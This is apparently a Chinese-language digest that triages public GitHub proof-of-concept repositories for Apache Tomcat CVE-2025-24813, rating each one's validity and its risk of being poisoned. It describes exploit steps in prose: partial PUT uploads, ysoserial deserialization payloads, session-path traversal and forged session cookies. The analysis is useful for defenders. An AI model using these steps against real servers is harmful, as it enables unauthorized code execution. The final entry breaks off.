**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

